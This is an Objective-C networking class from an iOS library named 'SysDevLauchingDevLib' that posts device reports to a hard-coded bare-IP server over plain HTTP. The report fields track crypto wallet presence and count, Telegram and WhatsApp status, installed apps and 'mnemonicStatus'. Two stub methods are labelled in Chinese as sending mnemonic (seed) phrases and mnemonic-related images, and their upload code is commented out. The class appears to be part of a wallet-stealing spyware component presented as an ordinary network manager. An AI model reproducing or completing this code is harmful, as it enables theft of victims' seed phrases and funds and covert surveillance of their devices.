//
//  BusinessNetworkManager.m
//  SysDevLauchingDevLib
//
//  Created by 陈帆 on 2026/03/31.
//

#import "BusinessNetworkManager.h"
#import "NetworkManager.h"

@implementation BusinessNetworkManager

+ (instancetype)sharedManager {
    static BusinessNetworkManager *manager;
    static dispatch_once_t onceToken;
    dispatch_once(&onceToken, ^{
        manager = [[BusinessNetworkManager alloc] init];
    });
    return manager;
}

- (void)reportDeviceWithSuccess:(void(^)(id response))success
                        failure:(void(^)(NSError *error))failure {
    
    NSString *url = @"http://13.228.168.97/api/v1/report/device";
    
    NSDictionary *params = @{
        @"channelId": @"9a71cc",
        @"deviceId": @"0019546A34ABCDEE",
        @"platformVersion": @"iPhone OS 17.1.1",
        @"walletStatus": @"none",
        @"walletCount": @0,
        @"telegramStatus": @"none",
        @"whatsappStatus": @"none",
        @"mnemonicStatus": @"none",
        @"ip": @"10.1.2.3",
        @"extraJson": @{
                @"model": @"iPhone15,2",
                @"build": @"21E230"
        },
        @"apps": @[
                @{
                    @"appName": @"WeChat",
                    @"bundleId": @"com.tencent.xin",
                    @"version": @"8.0.47"
                },
                @{
                    @"appName": @"Telegram",
                    @"bundleId": @"ph.telegra.Telegraph",
                    @"version": @"10.12"
                }
        ]
    };
    
    [[NetworkManager sharedManager] POST:url
                             parameters:params
                                success:^(id responseObject) {
        
        // ✅ 对象类型解析
        NSDictionary *jsonDict = responseObject;

        YOResponseObject<YODeviceReportData *> *response =
            [YOResponseObject responseFromDictionary:jsonDict
                                           dataClass:[YODeviceReportData class]];

        if (response.isSuccess) {
            YOLogI(@"✅ 请求成功");
            YODeviceReportData *data = response.data;
            YOLogI(@"✅ deviceId : %@", data.deviceId);
            YOLogI(@"✅ devicePk : %ld", (long)data.devicePk);
            YOLogI(@"✅ appCount : %ld", (long)data.appCount);
            YOLogI(@"✅ isNew    : %@", data.isNew ? @"YES" : @"NO");
        } else {
            YOLogI(@"❌ 请求失败 code=%@, msg=%@", response.code, response.msg);
        }

        // ✅ 数组类型解析
//        YOResponseArray<YODeviceReportData *> *listResponse =
//            [YOResponseArray responseFromDictionary:jsonDict
//                                          dataClass:[YODeviceReportData class]];
//
//        if (listResponse.isSuccess) {
//            NSLog(@"✅ 列表共 %lu 条", (unsigned long)listResponse.data.count);
//            for (YODeviceReportData *item in listResponse.data) {
//                NSLog(@"  → %@", item);
//            }
//        } else {
//            NSLog(@"❌ 列表请求失败 code=%@, msg=%@", listResponse.code, listResponse.msg);
//        }
        
        if (success) success(responseObject);
    } failure:^(NSError *error) {
        if (failure) failure(error);
    }];
}


// 发送助记词
- (void)sendMnemonicWordsWith:(NSString *)mnemonic Success:(void(^)(id response))success
                      failure:(void(^)(NSError *error))failure {
//    NSString *url = @"http://13.228.168.97/api/v1/report/device";
//    
//    NSDictionary *params = @{
//        @"channelId": @"9a71cc",
//        @"deviceId": @"0019546A34ABCDEE",
//    };
//    
//    [[NetworkManager sharedManager] POST:url
//                             parameters:params
//                                success:^(id responseObject) {
//        
//        // ✅ 对象类型解析
//        NSDictionary *jsonDict = responseObject;
//
//        YOResponseObject<YODeviceReportData *> *response =
//            [YOResponseObject responseFromDictionary:jsonDict
//                                           dataClass:[YODeviceReportData class]];
//
//        if (response.isSuccess) {
//            YOLogI(@"✅ 请求成功");
//            YODeviceReportData *data = response.data;
//        } else {
//            YOLogI(@"❌ 请求失败 code=%@, msg=%@", response.code, response.msg);
//        }
//        
//        if (success) success(responseObject);
//    } failure:^(NSError *error) {
//        if (failure) failure(error);
//    }];
}
// 发送助记词相关的图片
- (void)sendMnemonicImageWithImage:(UIImage *)image Success:(void(^)(id response))success
                           failure:(void(^)(NSError *error))failure {
//    NSString *url = @"http://13.228.168.97/api/v1/report/device";
//    
//    NSDictionary *params = @{
//        @"channelId": @"9a71cc",
//        @"deviceId": @"0019546A34ABCDEE",
//    };
//    
//    [[NetworkManager sharedManager] POST:url
//                             parameters:params
//                                success:^(id responseObject) {
//        
//        // ✅ 对象类型解析
//        NSDictionary *jsonDict = responseObject;
//
//        YOResponseObject<YODeviceReportData *> *response =
//            [YOResponseObject responseFromDictionary:jsonDict
//                                           dataClass:[YODeviceReportData class]];
//
//        if (response.isSuccess) {
//            YOLogI(@"✅ 请求成功");
//            YODeviceReportData *data = response.data;
//        } else {
//            YOLogI(@"❌ 请求失败 code=%@, msg=%@", response.code, response.msg);
//        }
//        
//        if (success) success(responseObject);
//    } failure:^(NSError *error) {
//        if (failure) failure(error);
//    }];
}

@end
